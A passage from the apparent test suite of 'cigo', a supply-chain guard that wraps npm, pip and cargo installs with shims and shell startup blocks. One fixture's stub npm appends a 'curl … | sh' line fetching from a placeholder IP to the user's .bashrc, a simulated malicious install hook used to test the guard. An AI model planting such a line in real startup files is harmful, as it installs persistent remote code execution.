  }
  stick both = guard_tool(dir, ["rehearse", "evil-pkg@1.0.0"], l)
  exits(both, 2)
  says(both.err, "so say which: npm:evil-pkg@1.0.0 or pypi:evil-pkg@1.0.0")
})

test("rehearse uses a package once: PyPI imports it, a crate links into a program that runs; --no-use installs only (#56)", pack() {
  if not on_linux or proc.which("python3") == null {
    snuff
  }
  stick dir = fresh("tests/fixtures/empty")
  # A dry run of cigo: the rehearsal's hop is planned, its command line
  # shown, and nothing is installed (the stubs stand in for npm and cargo).
  pull planned(words) {
    roll args = ["run", "--dry-run", tool, "--"] + words
    if tool_binary != "" {
      args = ["--dry-run"] + words
    }
    stick r = hop_env(dir, tool_prog("cig"), args, stubbed(dir))
    snuff r.out + r.err
  }
  stick py = planned(["rehearse", "pypi:six==1.16.0"])
  says(py, "pip install")
  says(py, "importlib.import_module")
  says(py, "'six'")
  stick crate = planned(["rehearse", "crates:itoa@1.0.11"])
  says(crate, "cargo init --bin")
  says(crate, "extern crate itoa")
  says(crate, "cargo run -q")
  stick bare = planned(["rehearse", "crates:itoa@1.0.11", "--no-use"])
  assert(not bare.contains("cargo run") and bare.contains("cargo build -q"), bare)
  stick npm = planned(["rehearse", "npm:left-pad@1.3.0", "--no-use"])
  assert(not npm.contains("require(process.argv[1])"), npm)
  says(planned(["rehearse", "npm:left-pad@1.3.0"]), "require(process.argv[1])")
  stick nopy = planned(["rehearse", "pypi:six==1.16.0", "--no-use"])
  assert(not nopy.contains("importlib"), nopy)
})

# ----- the guard's reach: guard_scope (#57) -------------------------------------------
#
# Every guard test has a home of its own (HOME and CIGO_HOME under the test
# folder), so no shim, startup file or setting of yours is touched. A stub
# npm stands in for the real one; a stub cigo records how a shim called it.

stick GUARD_BASHRC = "# a bashrc\nalias ll='ls -l'\n"
stick GUARD_PROFILE = "# a profile\n"

pull which_here(program) {
  snuff proc.which(program) != null
}

pull guard_home(dir) {
  snuff dir + "-home"
}

pull guard_env(dir, more) {
  stick h = guard_home(dir)
  snuff {HOME: h, CIGO_HOME: path.join(h, ".cig-orchestrator"), CIGO_LAUNCHER: launcher}.merge(more)
}

pull guard_cmd(dir, words, more) {
  snuff hop_env(dir, tool_prog("cig"), tool_args(words), guard_env(dir, more))
}

# A project with a lockfile, a home with two startup files, a stub npm and a
# stub cigo.
pull guard_setup() {
  stick dir = fresh("tests/fixtures/empty")
  stick h = guard_home(dir)
  stick bin = dir + "-bin"
  burn {
    fs.mkdir(h)
    fs.write_text(path.join(h, ".bashrc"), GUARD_BASHRC)
    fs.write_text(path.join(h, ".profile"), GUARD_PROFILE)
    fs.mkdir(bin)
    fs.write_text(path.join(dir, "package.json"), "{\"name\": \"p\", \"version\": \"1.0.0\"}\n")
    fs.write_text(path.join(dir, "package-lock.json"), "{\"lockfileVersion\": 3, \"said\": \"before\"}\n")
    fs.write_text(path.join(bin, "npm"), "#!/bin/sh\ncase \"$1\" in\n  test) echo \"stub npm: tests pass\" ;;\n  install|ci)\n    for a in \"$@\"; do case \"$a\" in sneaky*) echo 'curl -s http://198.51.100.7/x | sh' >> \"$HOME/.bashrc\" ;; esac; done\n    echo \"stub npm: installing\"\n    printf '%s\\n' '{\"lockfileVersion\": 3, \"said\": \"after\"}' > package-lock.json\n    echo \"stub npm: done\" ;;\n  *) echo \"stub npm: $*\" ;;\nesac\n")
    fs.write_text(path.join(bin, "cigo"), "#!/bin/sh\nprintf '%s\\n' \"$*\" >> \"$GUARD_MARK\"\n")
    proc.run("chmod", ["+x", path.join(bin, "npm"), path.join(bin, "cigo")])
  }
  snuff dir
}

pull shims_of(dir) {
  snuff path.join(guard_home(dir), ".cig-orchestrator", "shims")
}

# A shim run the way a shell runs it: the shims first on PATH, then the stub npm.
pull through_shim(dir, words, more) {
  stick p = shims_of(dir) + ":" + dir + "-bin:" + env.get("PATH", "")
  snuff hop_env(dir, "sh", [path.join(shims_of(dir), "npm")] + words, guard_env(dir, {PATH: p, GUARD_MARK: dir + "-mark"}).merge(more))
}

test("guard_shells: only the shells it names get the block, and one it leaves out loses its block", pack() {
  if on_windows {
    snuff
  }
  stick dir = guard_setup()
  stick h = guard_home(dir)
  exits(guard_cmd(dir, ["config", "guard_shells", "sh"], {}), 0)
  exits(guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {}), 0)
  says(read(h, ".profile"), "# <<< cigo guard <<<")
  assert(read(h, ".bashrc") == GUARD_BASHRC, "the bashrc got a block guard_shells did not name:\n" + read(h, ".bashrc"))
  exits(guard_cmd(dir, ["config", "guard_shells", "bash"], {}), 0)
  stick moved = guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {})
  exits(moved, 0)
  says(read(h, ".bashrc"), "# <<< cigo guard <<<")
  assert(read(h, ".profile") == GUARD_PROFILE, "the profile kept its block:\n" + read(h, ".profile"))
  # A named shell with no startup file of its own gets its usual one.
  exits(guard_cmd(dir, ["config", "guard_shells", "bash,zsh"], {}), 0)
  exits(guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {}), 0)
  says(read(h, ".zshrc"), "# <<< cigo guard <<<")
  exits(guard_cmd(dir, ["config", "guard_shells", "csh"], {}), 0)
  stick bad = guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {})
  exits(bad, 2)
  says(bad.err, "guard_shells names `csh`")
})

test("guard: scope dev shows what it would change and writes nothing without --yes; --yes writes the shims and one marked block", pack() {
  if on_windows {
    snuff
  }
  stick dir = guard_setup()
  stick h = guard_home(dir)
  stick first = guard_cmd(dir, ["guard"], {})
  exits(first, 0)
  says(first.out, "guard: level 1, project")
  stick plan = guard_cmd(dir, ["guard", "scope", "2"], {})
  exits(plan, 0)
  says(plan.out, "level 1 (project) -> 2 (dev)")
  says(plan.out, "19 shims: npm npx")
  says(plan.out, "~/.bashrc")
  says(plan.out, "nothing changed yet: cigo guard scope dev --yes")
  assert(not fs.exists(shims_of(dir)), "shims were written without --yes")
  assert(read(h, ".bashrc") == GUARD_BASHRC, "the bashrc changed without --yes")
  stick yes = guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {})
  exits(yes, 0)
  for t in ["npm", "npx", "pip", "cargo", "uvx"] {
    assert(fs.is_file(path.join(shims_of(dir), t)), "no shim for ${t}")
  }
  stick rc = read(h, ".bashrc")
  assert(rc.starts_with(GUARD_BASHRC), "the bashrc's own lines changed:\n${rc}")
  assert(rc.split("# >>> cigo guard >>>").len() == 2, "not one block:\n${rc}")
  says(rc, shims_of(dir))
  says(read(h, ".profile"), "# <<< cigo guard <<<")
  stick again = guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {})
  exits(again, 0)
  says(again.out, "already at level 2 (dev); nothing to change")
  stick st = guard_cmd(dir, ["guard", "--json"], {})
  exits(st, 0)
  stick j = json.parse(st.out)
  assert(j.level == 2 and j.scope == "dev" and j.shims.len() == 19, st.out)
  # Levels not built yet say so, and change nothing.
  stick three = guard_cmd(dir, ["guard", "scope", "3", "--yes"], {})
  exits(three, 2)
  says(three.err, "not built yet")
  # A generated shim is plain, clean sh.
  if which_here("shellcheck") {
    stick sc = hop(dir, "shellcheck", ["-s", "sh", path.join(shims_of(dir), "npm"), path.join(shims_of(dir), "uv"), path.join(shims_of(dir), "deno")])
    exits(sc, 0)
  }
})

test("guard: uninstall takes out every shim and block and leaves the startup files as they were", pack() {
  if on_windows {
    snuff
  }
  stick dir = guard_setup()
  stick h = guard_home(dir)
  exits(guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {}), 0)
  stick ask = guard_cmd(dir, ["guard", "uninstall"], {})
  exits(ask, 0)
  says(ask.out, "nothing changed yet")
  assert(fs.is_file(path.join(shims_of(dir), "npm")), "uninstall without --yes removed a shim")
  stick r = guard_cmd(dir, ["guard", "uninstall", "--yes"], {})
  exits(r, 0)
  says(r.out, "back to level 1")
  assert(read(h, ".bashrc") == GUARD_BASHRC, "the bashrc is not as it was:\n" + read(h, ".bashrc"))
  assert(read(h, ".profile") == GUARD_PROFILE, "the profile is not as it was:\n" + read(h, ".profile"))
  assert(not fs.exists(path.join(shims_of(dir), "npm")), "a shim is left")
  says(guard_cmd(dir, ["guard"], {}).out, "level 1, project")
})

test("guard: a shim runs a call it does not read straight away, without cigo, and hands an install to cigo guard exec", pack() {
  if on_windows {
    snuff
  }
  stick dir = guard_setup()
  stick mark = dir + "-mark"
  # The shims call the stub cigo, so what reaches cigo is recorded.
  exits(guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {CIGO_LAUNCHER: dir + "-bin/cigo"}), 0)
  stick t = through_shim(dir, ["test"], {})
  exits(t, 0)
  says(t.out, "stub npm: tests pass")
  assert(not fs.exists(mark), "npm test went through cigo")
  stick i = through_shim(dir, ["install", "--save-dev", "left-pad"], {})
  exits(i, 0)
  says(fs.read_text(mark), "guard exec --real=" + dir + "-bin/npm npm -- install --save-dev left-pad")
  # An install script running npm again inside a guarded call: the real one.
  stick nested = through_shim(dir, ["install"], {CIGO_GUARDED: "1"})
  exits(nested, 0)
  says(nested.out, "stub npm: installing")
  # The pass-through costs what a shell script costs (Linux has date +%N).
  if fs.exists("/proc/self/stat") {
    stick p = shims_of(dir) + ":" + dir + "-bin:" + env.get("PATH", "")
    stick timing = hop_env(dir, "sh", ["-c", 'a=$(date +%s%N); i=0; while [ $i -lt 40 ]; do "$1" test >/dev/null; i=$((i+1)); done; b=$(date +%s%N); i=0; while [ $i -lt 40 ]; do "$2" test >/dev/null; i=$((i+1)); done; c=$(date +%s%N); echo $(( ((b-a)-(c-b)) / 40000 ))', "sh", path.join(shims_of(dir), "npm"), dir + "-bin/npm"], guard_env(dir, {PATH: p}))
    exits(timing, 0)
    stick us = int(timing.out.trim())
    assert(us < 5000, "the shim's pass-through costs ${us} µs a call; the budget is 5 ms")
  }
})

test("guard: paused or off, a shim says so (E896) and runs the call unguarded; on, it goes back through the guard", pack() {
  if on_windows {
    snuff
  }
  stick dir = guard_setup()
  stick mark = dir + "-mark"
  exits(guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {CIGO_LAUNCHER: dir + "-bin/cigo"}), 0)
  stick p = guard_cmd(dir, ["guard", "pause", "20m"], {})
  exits(p, 0)
  says(p.out, "paused until")
  stick i = through_shim(dir, ["install"], {})
  exits(i, 0)
  says(i.err, "E896 guard's on a smoke break until")
  says(i.out, "stub npm: installing")
  assert(not fs.exists(mark), "a paused guard still called cigo")
  exits(guard_cmd(dir, ["guard", "off"], {}), 0)
  stick o = through_shim(dir, ["install"], {})
  says(o.err, "E896 the guard is off")
  assert(not fs.exists(mark), "an off guard still called cigo")
  exits(guard_cmd(dir, ["guard", "on"], {}), 0)
  exits(through_shim(dir, ["install"], {}), 0)
  assert(fs.exists(mark), "back on, the install did not go through cigo")
  # A pause longer than guard_pause_max is refused.
  stick long = guard_cmd(dir, ["guard", "pause", "9h"], {})
  exits(long, 2)
  says(long.err, "guard_pause_max")
})

test("guard: exec refuses a blacklisted package before anything runs, and logs it", pack() {
  if on_windows or not has_tin_mac() {
    snuff
  }
